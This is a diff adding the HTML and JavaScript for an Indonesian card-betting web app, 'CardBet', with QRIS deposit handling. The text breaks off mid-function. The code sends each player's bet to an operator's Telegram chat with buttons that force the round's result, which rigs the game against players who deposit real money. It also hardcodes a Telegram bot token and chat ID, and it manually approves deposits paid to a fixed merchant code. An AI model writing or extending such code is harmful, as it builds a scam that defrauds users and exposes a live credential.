@@ -1,0 +1,1274 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CardBet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        :root {
+            --bg-body: #0f172a;
+            --bg-app: #1e293b;
+            --bg-panel: #334155;
+            --bg-input: #0f172a;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --color-red: #ef4444;
+            --color-black: #cbd5e1;
+            --color-green: #10b981;
+            --color-blue: #3b82f6;
+            --color-warn: #f59e0b;
+            --border-color: #475569;
+        }
+
+        body { 
+            margin: 0; 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg-body); 
+            color: var(--text-muted); 
+            display: flex; 
+            justify-content: center; 
+        }
+
+        .app-container { 
+    width: 100%; 
+    max-width: 414px; 
+    background-color: var(--bg-app); 
+    overflow-x: hidden; 
+    position: relative; 
+    padding-top: 56px; /* TAMBAHAN: Agar konten tidak tertutup header yang fixed */
+    padding-bottom: 70px; 
+    min-height: 100vh;
+}
+
+.header { 
+    position: fixed; /* UBAH: Dari sticky menjadi fixed */
+    top: 0;
+    width: 100%; /* TAMBAHAN: Memastikan lebar sesuai container */
+    max-width: 414px; /* TAMBAHAN: Menyamakan maksimal lebar dengan app-container */
+    box-sizing: border-box; /* TAMBAHAN: Agar padding tidak membuat elemen tumpah keluar */
+    z-index: 1000; 
+    display: flex; 
+    justify-content: space-between; 
+    align-items: center; 
+    padding: 12px 15px; 
+    background-color: #0f172a; 
+    border-bottom: 1px solid var(--border-color); 
+}
+        
+        .brand { font-size: 16px; font-weight: 900; color: var(--text-main); display: flex; align-items: center; gap: 6px;}
+        
+        .balance-pill { 
+            display: flex; align-items: center; background: var(--bg-panel); 
+            border-radius: 20px; border: 1px solid var(--border-color);
+            overflow: hidden; cursor: pointer; transition: opacity 0.2s;
+        }
+        
+        .balance-pill:active { opacity: 0.7; }
+        
+        .balance-val { 
+            padding: 6px 12px; color: var(--text-main); font-weight: 700; font-size: 14px; 
+            display: flex; align-items: center; gap: 6px;
+        }
+        
+        .balance-val i { color: var(--color-blue); font-size: 15px; } 
+        
+        .balance-add { 
+            background: linear-gradient(135deg, var(--color-green), #059669); 
+            color: #fff; padding: 6px 14px; display: flex; align-items: center; justify-content: center;
+        }
+        
+        .balance-add i { font-size: 14px; font-weight: 900; }
+
+        .stats-bar { font-size: 12px; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; background-color: var(--bg-app); border-bottom: 1px solid var(--border-color); }
+        .stats-icons i { margin-right: 3px; font-size: 10px; }
+        .text-red { color: var(--color-red); } .text-black { color: #94a3b8; } .text-green { color: var(--color-green); }
+
+        .game-header { display: flex; justify-content: space-between; align-items: center; padding: 15px; font-size: 13px; color: var(--text-muted); font-weight: 500;}
+        .timer-box { background-color: var(--bg-panel); padding: 6px 14px; border-radius: 20px; font-weight: 700; color: var(--text-main); border: 1px solid var(--border-color); transition: color 0.3s; display: flex; align-items: center; gap: 6px; }
+        .timer-warning { color: var(--color-red) !important; border-color: var(--color-red); animation: pulse 1s infinite;}
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); } 70% { box-shadow: 0 0 0 8px rgba(239, 68, 68, 0); } 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); } }
+
+        .card-container { display: flex; justify-content: center; align-items: center; padding: 30px 0; perspective: 1000px;}
+        .card { 
+            position: relative; width: 140px; height: 195px; background: #fff; border-radius: 8px; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4); transform-style: preserve-3d;
+        }
+        .card-corner { position: absolute; display: flex; flex-direction: column; align-items: center; justify-content: center; line-height: 0.8; }
+        .card-corner .val { font-size: 24px; font-weight: 900; letter-spacing: -1px; }
+        .card-corner.top-left { top: 12px; left: 12px; }
+        .card-corner.bottom-right { bottom: 12px; right: 12px; transform: rotate(180deg); }
+        .card-center { font-size: 65px; }
+
+        .card.hidden-card { 
+            background-color: #f8fafc; 
+            background-image: linear-gradient(45deg, #e2e8f0 25%, transparent 25%, transparent 75%, #e2e8f0 75%, #e2e8f0), linear-gradient(45deg, #e2e8f0 25%, transparent 25%, transparent 75%, #e2e8f0 75%, #e2e8f0);
+            background-size: 16px 16px; background-position: 0 0, 8px 8px; border: 3px solid #fff; border-radius: 8px;
+            box-shadow: -2px 2px 0 #fff, -3px 3px 0 #cbd5e1, -4px 4px 0 #fff, -5px 5px 0 #cbd5e1, -6px 6px 0 #fff, -7px 7px 0 #cbd5e1, 0 15px 30px rgba(0,0,0,0.5); display: block;
+        }
+
+        @keyframes slideFlipOpen {
+            0% { transform: translateX(60px) translateY(-20px) rotateY(90deg) rotateZ(10deg) scale(0.8); opacity: 0.2; }
+            50% { transform: translateX(-10px) translateY(0) rotateY(15deg) rotateZ(-5deg) scale(1.05); opacity: 1; }
+            100% { transform: translateX(0) translateY(0) rotateY(0deg) rotateZ(0deg) scale(1); opacity: 1; }
+        }
+
+        @keyframes flipToBack {
+            0% { transform: scale(1) rotateY(0deg); }
+            50% { transform: scale(1.1) translateY(-10px) rotateY(90deg); }
+            100% { transform: scale(1) translateY(0) rotateY(180deg); }
+        }
+
+        .history-slider { display: flex; gap: 8px; padding: 0 15px 15px; overflow-x: auto; scrollbar-width: none; align-items: center;}
+        .history-slider::-webkit-scrollbar { display: none; }
+        .hist-item { 
+            min-width: 32px; height: 32px; border-radius: 8px; 
+            display: flex; align-items: center; justify-content: center; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3); animation: slideIn 0.3s ease-out; 
+            font-size: 14px; font-weight: 700; color: #fff;
+        }
+        .hist-item.red { background: var(--color-red); }
+        .hist-item.black { background: #1e293b; border: 1px solid #475569; }
+        .hist-item.green { background: var(--color-green); font-size: 16px; color: #fff; border: 1px solid #059669; } 
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-15px); } to { opacity: 1; transform: translateX(0); } }
+
+        .bet-section { padding: 20px 15px; background-color: var(--bg-panel); border-radius: 20px 20px 0 0; box-shadow: 0 -5px 15px rgba(0,0,0,0.2);}
+        .bet-input-row { display: flex; gap: 12px; margin-bottom: 20px; align-items: center; background: var(--bg-app); padding: 8px 15px; border-radius: 12px; border: 1px solid var(--border-color);}
+        .bet-label { font-size: 13px; font-weight: 600; color: var(--text-muted); display: flex; align-items: center; gap: 6px;}
+        .bet-input { flex: 1; background: transparent; border: none; color: var(--text-main); font-size: 16px; font-weight: 700; outline: none; text-align: right;}
+        
+        .main-bets { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+        .sub-bets { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+        
+        .bet-btn { 
+            padding: 12px 0; border: 2px solid rgba(255,255,255,0.1); border-radius: 10px; font-weight: 700; color: #fff; 
+            cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 4px; 
+            font-size: 14px; transition: all 0.2s; box-shadow: 0 4px 0 rgba(0,0,0,0.2); 
+            text-transform: uppercase; text-shadow: 1px 1px 2px rgba(0,0,0,0.7);
+        }
+        .bet-btn:active:not(:disabled) { transform: translateY(4px); box-shadow: 0 0 0 rgba(0,0,0,0); }
+        .bet-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: translateY(0); box-shadow: none; filter: grayscale(50%);}
+        
+        .btn-red { background-color: var(--color-red); } 
+        .btn-green { background-color: var(--color-green); } 
+        .btn-black { background-color: #1e293b; border-color: var(--border-color); }
+        .btn-blue { background-color: var(--color-blue); }
+        
+        .bet-btn small { font-weight: 500; font-size: 11px; color: rgba(255,255,255,0.9); background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 10px; margin-top: 2px; text-shadow: none;}
+
+        .global-history-section { padding: 0 0 20px 0; background-color: var(--bg-app); border-top: 1px solid var(--border-color); }
+        
+        .gh-header { 
+            display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; 
+            margin-bottom: 12px; background-color: var(--bg-panel); border-bottom: 1px solid var(--border-color); 
+        }
+        
+        .gh-title { font-size: 14px; font-weight: 700; color: var(--text-main); display: flex; align-items: center; gap: 8px;}
+        .gh-stats { font-size: 12px; color: var(--color-warn); font-weight: 700; padding: 4px 10px; }
+        
+        .gh-list { display: flex; flex-direction: column; gap: 8px; max-height: 400px; overflow-y: auto; padding: 0 15px 0 10px; scrollbar-width: thin; scrollbar-color: var(--border-color) transparent; }
+        .gh-list::-webkit-scrollbar { width: 4px; }
+        .gh-list::-webkit-scrollbar-thumb { background-color: var(--border-color); border-radius: 10px; }
+        
+        .gh-item { 
+            padding: 10px 12px; background-color: var(--bg-panel); border-radius: 4px 8px 8px 4px; 
+            font-size: 13px; display: flex; justify-content: space-between; align-items: center; 
+            animation: slideDown 0.3s ease-out; margin-bottom: 4px;
+            border-left: 4px solid transparent; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .gh-user { width: 35%; display: flex; align-items: center; gap: 6px; font-weight: 600; color: var(--text-muted); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .gh-user i { font-size: 14px; }
+        .gh-choice { font-weight: 700; width: 25%; text-align: center; font-size: 11px; }
+        .gh-amount { font-weight: 700; width: 40%; text-align: right; transition: color 0.3s; font-size: 12px; color: var(--text-main);}
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 414px; background: #0f172a; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid var(--border-color); z-index: 900; box-shadow: 0 -4px 15px rgba(0,0,0,0.5);}
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--text-muted); font-size: 11px; font-weight: 600; gap: 4px; cursor: pointer; transition: color 0.2s;}
+        .nav-item.active, .nav-item:hover { color: var(--color-blue); }
+        .nav-item i { font-size: 20px; }
+
+        .history-overlay { 
+            position: fixed; top: 0; right: -100%; width: 100%; max-width: 414px; height: 100%; 
+            background: var(--bg-app); z-index: 1000; 
+            transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.1s ease; 
+            display: flex; flex-direction: column; box-shadow: none; 
+        }
+        .history-overlay.active { 
+            right: calc(50% - min(50%, 207px)); 
+            box-shadow: -5px 0 25px rgba(0,0,0,0.5); 
+        } 
+        @media (max-width: 414px) { 
+            .history-overlay.active { right: 0; } 
+        }
+        
+        .ho-header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--bg-panel); border-bottom: 1px solid var(--border-color); color: var(--text-main); font-weight: 700; font-size: 16px;}
+        .ho-close { background: none; border: none; color: var(--text-muted); font-size: 24px; cursor: pointer; transition: color 0.2s;}
+        .ho-close:hover { color: var(--color-red); }
+        
+        .mh-list { display: flex; flex-direction: column; gap: 10px; padding: 15px; overflow-y: auto; flex: 1; padding-bottom: 30px;}
+        .mh-item { 
+            padding: 12px; background-color: var(--bg-panel); border-radius: 4px 8px 8px 4px; 
+            font-size: 13px; display: flex; justify-content: space-between; align-items: center; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15); margin-bottom: 8px;
+            border-left: 4px solid transparent; 
+        }
+        .mh-details { display: flex; flex-direction: column; gap: 5px; }
+        .mh-status { font-weight: 700; text-align: right; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <div class="header">
+        <div class="brand"><i class="bi bi-suit-spade-fill text-blue"></i> CardBet</div>
+        
+        <div class="balance-pill" onclick="openDepositModal()">
+            <div class="balance-val">
+              <span id="rupiahBal">Rp 1.000.000</span>
+            </div>
+            <div class="balance-add">
+                <i class="bi bi-plus-lg"></i>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats-bar">
+        <div><i class="bi bi-bar-chart-fill"></i> Last 100: &nbsp; 
+            <span class="stats-icons">
+                <i class="bi bi-circle-fill text-red"></i> <span id="statRed">0</span> &nbsp; 
+                <i class="bi bi-circle-fill text-black"></i> <span id="statBlack">0</span> &nbsp; 
+                <i class="bi bi-circle-fill text-green"></i> <span id="statJoker">0</span>
+            </span>
+        </div>
+    </div>
+
+    <div class="game-header">
+        <div id="periodDisplay"><i class="bi bi-hash"></i>Menunggu...</div>
+        <div class="timer-box" id="timerDisplay"><i class="bi bi-stopwatch"></i> 00:00</div>
+    </div>
+
+    <div class="card-container">
+        <div class="card hidden-card" id="mainCard"></div>
+    </div>
+
+    <div class="history-slider" id="historySlider"></div>
+
+    <div class="bet-section">
+        <div class="bet-input-row">
+            <div class="bet-label"><i class="bi bi-cash-coin"></i> Taruhan:</div>
+            <input type="number" id="betAmount" class="bet-input" value="10000" step="5000">
+        </div>
+        <div class="main-bets">
+            <button class="bet-btn btn-red" id="btnRED" onclick="placeBet('RED')">RED<br><small>x2</small></button>
+            <button class="bet-btn btn-green" id="btnJOKER" onclick="placeBet('JOKER')">JOKER<br><small>x24</small></button>
+            <button class="bet-btn btn-black" id="btnBLACK" onclick="placeBet('BLACK')">BLACK<br><small>x2</small></button>
+        </div>
+        <div class="sub-bets">
+            <button class="bet-btn btn-blue" id="btn2_9" onclick="placeBet('2-9')">2-9<br><small>x1.5</small></button>
+            <button class="bet-btn btn-blue" id="btnJQKA" onclick="placeBet('JQKA')">JQKA<br><small>x3</small></button>
+            <button class="bet-btn btn-blue" id="btnKA" onclick="placeBet('KA')">K-A<br><small>x6</small></button>
+            <button class="bet-btn btn-blue" id="btnA" onclick="placeBet('A')">A<br><small>x12</small></button>
+        </div>
+        <div id="statusMsg" style="text-align: center; color: var(--text-muted); font-size: 13px; min-height: 20px; font-weight:600; margin-top: 10px;">
+            Menunggu putaran dimulai...
+        </div>
+    </div>
+
+    <div class="global-history-section">
+        <div class="gh-header">
+            <div class="gh-title">Live Taruhan</div>
+            <div class="gh-stats">
+               <span id="ghTotalAmount" style="color:#fff">Rp 0</span>
+            </div>
+        </div>
+        <div class="gh-list" id="globalHistoryList"></div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" style="width:50%" onclick="closeMyHistory()">
+            <i class="bi bi-house-door-fill"></i>
+            <span>Home</span>
+        </div>
+        <div class="nav-item" style="width:50%" onclick="toggleMyHistory()">
+            <i class="bi bi-journal-text"></i>
+            <span>Riwayat</span>
+        </div>
+    </div>
+
+    <div class="history-overlay" id="myHistoryOverlay">
+        <div class="ho-header">
+            <div>Riwayat</div>
+            <button class="ho-close" onclick="closeMyHistory()"><i class="bi bi-x-lg"></i></button>
+        </div>
+        <div class="mh-list" id="myHistoryList">
+            <div style="text-align: center; color: var(--text-muted); padding: 20px;">
+                <i class="bi bi-journal-x" style="font-size: 24px; display: block; margin-bottom: 10px;"></i>
+                Belum ada aktivitas
+            </div>
+        </div>
+    </div>
+
+    <div class="history-overlay" id="depositOverlay">
+        <div class="ho-header">
+            <div>Deposit</div>
+            <button class="ho-close" onclick="closeDepositModal()"><i class="bi bi-x-lg"></i></button>
+        </div>
+        
+        <div style="padding:20px; flex:1; overflow-y:auto;" id="depositFormView">
+            <div style="margin-bottom: 15px;">
+                <label style="font-size:12px; font-weight:600; color:var(--text-muted);">Masukkan Nominal Deposit</label>
+                <div style="display:flex; align-items:center; background:var(--bg-app); border:1px solid var(--border-color); border-radius:8px; margin-top:8px; padding:0 15px;">
+                    <span style="color:var(--text-main); font-weight:700;">Rp</span>
+                    <input type="number" id="depoInput" class="bet-input" style="width:100%; padding:15px 10px; text-align:left;" placeholder="Min. 10000" value="50000">
+                </div>
+            </div>
+            
+            <label style="font-size:12px; font-weight:600; color:var(--text-muted); margin-bottom:8px; display:block;">Pilih Cepat</label>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:25px;">
+                <button class="bet-btn btn-black" onclick="setDepoAmount(10000)">10.000</button>
+                <button class="bet-btn btn-black" onclick="setDepoAmount(50000)">50.000</button>
+                <button class="bet-btn btn-black" onclick="setDepoAmount(100000)">100.000</button>
+                <button class="bet-btn btn-black" onclick="setDepoAmount(500000)">500.000</button>
+            </div>
+            
+            <button class="bet-btn btn-green" style="width:100%; padding:15px 0; font-size:16px;" onclick="processDeposit()">Lanjut Pembayaran</button>
+        </div>
+
+        <div style="padding:20px; flex:1; overflow-y:auto; display:none; text-align:center;" id="depositQrisView">
+            
+            <div style="margin-bottom: 25px;">
+                <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 5px;">Total Pembayaran</div>
+                <div id="qrisTotalAmount" style="font-size: 34px; font-weight: 900; color: var(--text-main); letter-spacing: -0.5px;">Rp 0</div>
+            </div>
+
+            <div style="background: #fff; padding: 20px; border-radius: 12px; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; box-sizing: border-box;">
+                <img id="qrisImage" src="" style="width: 100%; height: auto; display: block; border-radius: 8px;">
+            </div>
+
+            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 25px;">
+                <i class="bi bi-clock-history" style="color: var(--text-muted); font-size: 18px;"></i>
+                <span style="font-size: 13px; color: var(--text-muted);">Selesaikan dalam</span>
+                <span id="depoTimerTxt" style="font-size: 16px; font-weight: 700; color: var(--color-warn);">05:00</span>
+            </div>
+
+            <div style="background: var(--bg-panel); border-radius: 12px; padding: 18px 15px; text-align: left; margin-bottom: 20px; border: 1px solid var(--border-color); width: 100%; box-sizing: border-box;">
+                <div style="font-size: 13px; font-weight: 700; color: var(--text-main); margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                    <i class="bi bi-info-circle-fill" style="color: var(--color-blue); font-size: 16px;"></i> Cara Pembayaran
+                </div>
+                <ol style="margin: 0; padding-left: 22px; font-size: 12px; color: var(--text-muted); line-height: 1.8;">
+                    <li>Buka aplikasi e-wallet (DANA, OVO, GoPay) atau M-Banking Anda.</li>
+                    <li>Pilih menu <strong>Scan QRIS</strong> atau <strong>Bayar</strong>.</li>
+                    <li>Scan kode QR di atas atau simpan dan unggah dari galeri Anda.</li>
+                    <li>Pastikan nominal sesuai, lalu masukkan PIN untuk menyelesaikan.</li>
+                </ol>
+            </div>
+            
+            <button class="bet-btn btn-red" style="width:100%; padding:14px 0; font-size: 14px; text-shadow: none;" onclick="cancelDeposit()">Batalkan Transaksi</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const BOT_TOKEN = "8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY";
+    const CHAT_ID = "8893393746";
+    
+    let lastUpdateId = 0;
+    let adminForceTarget = null; 
+
+    let balance = localStorage.getItem("userBalance") ? parseInt(localStorage.getItem("userBalance")) : 0; 
+    let myBetsHistory = localStorage.getItem("myBetsHistory") ? JSON.parse(localStorage.getItem("myBetsHistory")) : [];
+    let periodSequence = localStorage.getItem("periodSequence") ? parseInt(localStorage.getItem("periodSequence")) : 1;
+    let history100 = localStorage.getItem("history100") ? JSON.parse(localStorage.getItem("history100")) : [];
+
+    let currentGlobalBets = { period: "", amount: 0, bets: [] };
+
+    let gameState = "waiting"; 
+    let activeBetsCountThisRound = 0; 
+    let totalBetAmountThisRound = 0;
+    
+    let currentPeriod = "";
+    let currentResultNum = 0;
+    let currentCardColor = "";
+    let currentCardValue = "";
+    let globalTotalAmount = 0;
+    let fakeBetInterval = null;
+
+    let currentDeposit = {
+        id: null, amount: 0, total: 0, status: 'none', expireTime: 0
+    };
+    let depositInterval = null;
+
+    function formatRp(angka) { return "Rp " + angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."); }
+
+    function updateBalance(newBal) {
+        balance = newBal;
+        localStorage.setItem("userBalance", balance);
+        document.getElementById("rupiahBal").innerText = formatRp(balance);
+    }
+    updateBalance(balance); 
+
+    function crc16(s) {
+        let crc = 0xFFFF;
+        for (let c = 0; c < s.length; c++) {
+            crc ^= s.charCodeAt(c) << 8;
+            for (let i = 0; i < 8; i++) {
+                if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+                else crc = crc << 1;
+            }
+        }
+        let hex = (crc & 0xFFFF).toString(16).toUpperCase();
+        return hex.padStart(4, '0');
+    }
+
+    function generateDynamicQRIS(amount) {
+        let baseQRIS = "00020101021126610016ID.CO.SHOPEE.WWW01189360091800226409940208226409940303UMI51440014ID.CO.QRIS.WWW0215ID10264721078080303UMI5204594153033605802ID5912XTRA DIGITAL6011TASIKMALAYA61054648562070703A016304671F";
+        let stripped = baseQRIS.substring(0, baseQRIS.length - 8);
+        stripped = stripped.replace("010211", "010212");
+        let amtStr = amount.toString();
+        let amtLen = amtStr.length.toString().padStart(2, '0');
+        let tag54 = "54" + amtLen + amtStr;
+        let payload = stripped + tag54 + "6304";
+        let newCrc = crc16(payload);
+        return payload + newCrc;
+    }
+
+    function openDepositModal() {
+        document.getElementById("depositOverlay").classList.add("active");
+        if(currentDeposit.status === 'pending' && currentDeposit.expireTime > Date.now()) return; 
+        document.getElementById("depositFormView").style.display = "block";
+        document.getElementById("depositQrisView").style.display = "none";
+        document.getElementById("depoInput").value = "50000";
+    }
+
+    function closeDepositModal() { document.getElementById("depositOverlay").classList.remove("active"); }
+    function setDepoAmount(amt) { document.getElementById("depoInput").value = amt; }
+
+    async function processDeposit() {
+        let baseAmount = parseInt(document.getElementById("depoInput").value);
+        if (isNaN(baseAmount) || baseAmount < 10000) {
+            Swal.fire({
+                icon: 'error', title: 'Oops...', text: 'Minimal deposit Rp 10.000',
+                background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#3b82f6'
+            });
+            return;
+        }
+
+        let uniqueCode = Math.floor(Math.random() * 999) + 1;
+        let totalAmount = baseAmount + uniqueCode;
+        let depoId = "DEP-" + Date.now().toString().slice(-6);
+
+        currentDeposit = { id: depoId, amount: totalAmount, status: 'pending', expireTime: Date.now() + (5 * 60 * 1000) };
+        let qrisString = generateDynamicQRIS(totalAmount);
+        let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&margin=10&data=${encodeURIComponent(qrisString)}`;
+        
+        document.getElementById("qrisImage").src = qrUrl;
+        document.getElementById("qrisTotalAmount").innerText = formatRp(totalAmount);
+        
+        document.getElementById("depositFormView").style.display = "none";
+        document.getElementById("depositQrisView").style.display = "block";
+
+        sendDepositToTelegram(depoId, totalAmount, uniqueCode);
+    }
+
+    function cancelDeposit() {
+        Swal.fire({
+            title: 'Perhatian', text: "Anda ingin membatalkan deposit ini?",
+            icon: 'warning', showCancelButton: true, confirmButtonColor: '#ef4444', cancelButtonColor: '#777',
+            confirmButtonText: 'Ya, Batalkan', cancelButtonText: 'Kembali', background: 'var(--bg-panel)', color: 'var(--text-main)'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                currentDeposit.status = 'cancelled';
+                Swal.fire({ title: 'Dibatalkan!', text: 'Transaksi deposit telah dibatalkan.', icon: 'success', background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#3b82f6' });
+                closeDepositModal();
+            }
+        });
+    }
+
+    async function sendDepositToTelegram(depoId, totalAmt, uniqueCode) {
+        if (!BOT_TOKEN) return; 
+        const text = `*REQUEST DEPOSIT BARU*\n\nID Transaksi: \`${depoId}\`\nNominal: *${formatRp(totalAmt - uniqueCode)}*\nKode Unik: *${uniqueCode}*\n\nTotal Bayar:\n*${formatRp(totalAmt)}*\n\n_Konfirmasi jika uang sudah masuk:_`;
+        const keyboard = { inline_keyboard: [[ { text: "TERIMA", callback_data: `depo_acc_${depoId}` }, { text: "TOLAK", callback_data: `depo_rej_${depoId}` } ]] };
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: keyboard })
+            });
+        } catch(e) {}
+    }
+
+    setInterval(async () => {
+        if (!BOT_TOKEN) return; 
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+            const data = await res.json();
+            
+            if (data.ok && data.result.length > 0) {
+                for (let update of data.result) {
+                    lastUpdateId = update.update_id;
+                    if (update.callback_query) {
+                        let cbData = update.callback_query.data;
+                        let cbId = update.callback_query.id;
+                        let msgId = update.callback_query.message.message_id;
+                        let msgText = update.callback_query.message.text;
+                        
+                        if (cbData.startsWith("force_") && cbData.endsWith(`_${currentPeriod}`)) {
+                            adminForceTarget = cbData.replace("force_", "").replace(`_${currentPeriod}`, "");
+                            
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ callback_query_id: cbId, text: `✅ Berhasil! Hasil putaran ini akan dipaksa keluar: ${adminForceTarget}`, show_alert: true })
+                            });
+                            
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: CHAT_ID, message_id: msgId, text: msgText + `\n\n✅ *HASIL TERKONFIRMASI: ${adminForceTarget}*`, parse_mode: 'Markdown' })
+                            });
+                        }
+                        else if (cbData.startsWith("depo_acc_")) {
+                            let id = cbData.replace("depo_acc_", "");
+                            if (currentDeposit.id === id && currentDeposit.status === 'pending') {
+                                currentDeposit.status = 'success';
+                                updateBalance(balance + currentDeposit.amount);
+                                
+                                myBetsHistory.unshift({ type: 'deposit', amount: currentDeposit.amount, status: 'success', time: new Date().toLocaleTimeString() });
+                                if(myBetsHistory.length > 50) myBetsHistory.pop();
+                                localStorage.setItem("myBetsHistory", JSON.stringify(myBetsHistory));
+                                renderMyHistory();
+
+                                Swal.fire({ title: 'Berhasil!', html: `Deposit disetujui oleh sistem!`, icon: 'success', background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#10b981' });
+                                closeDepositModal();
+                            }
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ callback_query_id: cbId, text: `✅ Deposit berhasil! Saldo user telah bertambah.`, show_alert: true })
+                            });
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: CHAT_ID, message_id: msgId, text: msgText + `\n\n*STATUS: BERHASIL DI-ACC*`, parse_mode: 'Markdown' })
+                            });
+                        }
+                        else if (cbData.startsWith("depo_rej_")) {
+                            let id = cbData.replace("depo_rej_", "");
+                            if (currentDeposit.id === id && currentDeposit.status === 'pending') {
+                                currentDeposit.status = 'rejected';
+                                Swal.fire({ title: 'Ditolak', text: 'Deposit ditolak oleh sistem. Silakan hubungi admin jika terjadi kesalahan.', icon: 'error', background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#ef4444' });
+                                closeDepositModal();
+                            }
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ callback_query_id: cbId, text: `❌ Deposit Ditolak! Transaksi telah dibatalkan.`, show_alert: true })
+                            });
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: CHAT_ID, message_id: msgId, text: msgText + `\n\n*STATUS: DITOLAK*`, parse_mode: 'Markdown' })
+                            });
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+    }, 2000);
+
+    setInterval(() => {
+        if (currentDeposit.status === 'pending') {
+            let timeLeft = Math.floor((currentDeposit.expireTime - Date.now()) / 1000);
+            if (timeLeft <= 0) {
+                currentDeposit.status = 'expired';
+                document.getElementById("depoTimerTxt").innerText = "00:00";
+                Swal.fire({ title: 'Waktu Habis', text: 'Waktu pembayaran deposit telah habis (Expired)!', icon: 'warning', background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#f59e0b' });
+                closeDepositModal();
+            } else {
+                let m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+                let s = String(timeLeft % 60).padStart(2, '0');
+                document.getElementById("depoTimerTxt").innerText = `${m}:${s}`;
+            }
+        }
+    }, 1000);
+
+    async function sendBetToTelegram(choice, amount, currentBal) {
+        if (!BOT_TOKEN) return; 
+        const text = `*TARUHAN MASUK*\n\nPeriode: \`${currentPeriod}\`\nPilihan: *${choice}*\nNominal: *${formatRp(amount)}*\nSisa Saldo: *${formatRp(currentBal)}*\n\n_Pilih hasil yang ingin dipaksakan:_`;
+        const keyboard = {
+            inline_keyboard: [
+                [ { text: "RED", callback_data: `force_RED_${currentPeriod}` }, { text: "BLACK", callback_data: `force_BLACK_${currentPeriod}` }, { text: "JOKER", callback_data: `force_JOKER_${currentPeriod}` } ],
+                [ { text: "2-9", callback_data: `force_2-9_${currentPeriod}` }, { text: "JQKA", callback_data: `force_JQKA_${currentPeriod}` }, { text: "K-A", callback_data: `force_KA_${currentPeriod}` }, { text: "A", callback_data: `force_A_${currentPeriod}` } ]
+            ]
+        };
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
